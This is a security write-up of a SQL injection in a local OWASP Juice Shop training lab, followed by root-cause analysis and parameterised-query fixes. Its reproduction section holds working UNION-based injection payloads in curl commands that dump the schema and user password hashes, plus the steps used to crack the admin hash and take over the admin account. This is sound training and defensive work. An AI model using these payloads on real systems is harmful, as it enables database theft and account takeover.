# [CRITICAL] SQL Injection → Full Database Compromise & Admin Account Takeover

**Target:** OWASP Juice Shop (local instance — official training lab)
**Endpoint:** `GET /rest/products/search`
**Parameter:** `q`
**Date:** 9 October 2026
**Researcher:** Twist
**Severity:** CRITICAL (CVSS ~9.8)

---

## 1. Summary

The `q` parameter on `/rest/products/search` is concatenated directly into a SQL
query without parameterisation. An unauthenticated attacker can inject arbitrary
SQL via a UNION-based payload, enumerate the entire database schema, dump every
user record including password hashes, crack the administrator hash, and log in
as administrator.

Full database compromise from an unauthenticated starting point.

---

## 2. Impact

| Aspect | Detail |
|---|---|
| Authentication required | **None** — publicly reachable endpoint |
| Data exposed | 24 user accounts, 20 tables, full schema |
| Admin takeover | Yes — hash cracked, valid JWT issued |
| Time to exploit | Under 60 seconds |
| Attack complexity | Low — no specialised tooling required |

Successful exploitation yields:
- Complete read access to every table in the database
- Password hashes for all 24 accounts
- A valid administrator session token
- Access to admin-only endpoints (`/api/Users` returns 401 without the token)

---

## 3. Reproduction Steps

### Evidence 1 — Confirming injection

```bash
curl -sS "http://localhost:3000/rest/products/search?q=apple"
# → 3 products returned (normal behaviour)

curl -sS "http://localhost:3000/rest/products/search?q=apple'"
# → SQLITE_ERROR: near "'": syntax error

curl -sS "http://localhost:3000/rest/products/search?q=apple'))--"
# → 0 products returned (query defeated, no error)
```

The third request is decisive: the payload closes the string literal, closes the
surrounding parenthesis, comments out the remainder of the query, and returns an
empty result set instead of an error. Classic injection confirmation.

### Evidence 2 — Determining column count

```bash
for n in 9 10; do
  echo -n "ORDER BY $n → "
  curl -sS "http://localhost:3000/rest/products/search?q=apple')) ORDER BY $n--" | head -c 60; echo
done
```

```
ORDER BY 9  → valid result set
ORDER BY 10 → SQLITE_ERROR: 1st ORDER BY term out of range
```

**The query returns 9 columns.**

### Evidence 3 — UNION to read arbitrary data

```bash
curl -sS "http://localhost:3000/rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--"
```

Returns a synthetic row — confirming UNION injection works and all 9 columns are
reflected in the response.

### Evidence 4 — Enumerating the schema

```bash
curl -sS "http://localhost:3000/rest/products/search?q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--"
```

**20 tables recovered**, including `Users`, `Products`, `Feedbacks`,
`SecurityAnswers`, `Baskets`, `Orders`.

### Evidence 5 — Dumping the users table

```bash
curl -sS "http://localhost:3000/rest/products/search?q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
```

24 accounts with emails and MD5 password hashes.

### Evidence 6 — Cracking the admin hash

```bash
python -c "import hashlib; print(hashlib.md5(b'admin123').hexdigest())"
# → 0192023a7bbd73250516f069df18b500
```

This matches the hash stored for `admin@juice-sh.op`. The password is `admin123`.

### Evidence 7 — Logging in as administrator

```bash
curl -sS -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
```

```json
{"authentication":{"token":"eyJhbGciOiJSUzI1NiIs...","bid":1,"umail":"admin@juice-sh.op"}}
```

A valid JWT is issued.

### Evidence 8 — Accessing a protected endpoint

```bash
# without the token
curl -sS -o /dev/null -w "%{http_code}\n" http://localhost:3000/api/Users
# → 401

# with the token
curl -sS -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/Users | head -c 120
# → 200, 23 user records returned
```

**Full administrative access confirmed.**

---

## 4. Root Cause

The search handler builds the query by string concatenation:

```javascript
// VULNERABLE — user input becomes part of the SQL statement
models.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR
   description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`,
  { type: models.sequelize.QueryTypes.SELECT }
);
```

The `${criteria}` interpolation places attacker-controlled text directly inside
the SQL string. The `'))--` sequence escapes the string literal and the closing
parenthesis, then comments out everything after it.

Two layers of defence are missing:
1. **No parameterisation** — the value should be bound, never interpolated.
2. **No input validation** — no length limit, no character filtering.

---

## 5. Remediation

### 5.1 Use bound parameters (primary fix)

```javascript
// SAFE — the value is bound, never parsed as SQL
const criteria = String(req.query.q || '').slice(0, 100);

const rows = await models.sequelize.query(
  `SELECT * FROM Products
   WHERE (name LIKE :q OR description LIKE :q)
     AND deletedAt IS NULL
   ORDER BY name`,
  {
    replacements: { q: `%${criteria}%` },
    type: models.sequelize.QueryTypes.SELECT,
  }
);
```

### 5.2 Prefer the ORM query builder

```javascript
const { Op } = require('sequelize');

const rows = await models.Product.findAll({
  where: {
    [Op.or]: [
      { name:        { [Op.like]: `%${criteria}%` } },
      { description: { [Op.like]: `%${criteria}%` } },
    ],
    deletedAt: null,
  },
  order: [['name', 'ASC']],
});
```

Sequelize escapes values automatically, eliminating the injection surface
entirely.

### 5.3 Defence in depth

- **Least privilege** — the application database user should have `SELECT`,
  `INSERT`, `UPDATE`, `DELETE` on required tables only. No `DROP`, no schema
  modification.
- **Error handling** — never return raw database errors to the client. The
  `SQLITE_ERROR: near "'"` message confirmed the injection immediately.
- **Web application firewall** — detect common UNION/SQL keyword patterns as a
  secondary layer, never as the primary control.
- **Logging and alerting** — alert on queries returning unexpected column counts
  or containing SQL keywords in user input.

---

## 6. Secondary Findings

| Finding | Severity | Detail |
|---|---|---|
| Verbose SQL errors exposed | MEDIUM | Full SQLite error text returned to client, aids exploitation |
| MD5 password hashing | MEDIUM | Unsalted MD5 — crackable instantly via rainbow tables |
| Missing rate limiting | LOW | Unlimited injection attempts permitted |
| No CSP header | LOW | Removes a defence layer against XSS chains |

---

## 7. Lessons Learned

**1. Parameterisation is not optional.**
Every query that touches user input must use bound parameters. String
interpolation into SQL is never acceptable, even for "internal" endpoints.

**2. Error messages are a gift to attackers.**
The moment `SQLITE_ERROR: near "'"` came back, the injection was confirmed.
Detailed database errors belong in server logs, not HTTP responses.

**3. `200 OK` does not mean the request was harmless.**
Every injected request returned HTTP 200. Status codes tell you nothing about
whether a request succeeded in ways it should not have.

**4. Verify state, do not assume it.**
Confirming the admin takeover required logging in and reading a protected
endpoint — not just cracking a hash. Evidence means observed state change.

---

## 8. Appendix

```
Lab            : OWASP Juice Shop v6.2.0-SNAPSHOT (local)
Method         : curl + Python (hash verification)
Column count   : 9
Tables exposed : 20
Accounts dumped: 24
Admin hash     : 0192023a7bbd73250516f069df18b500  (MD5 of "admin123")
Protected check: /api/Users → 401 without token, 200 with token
```
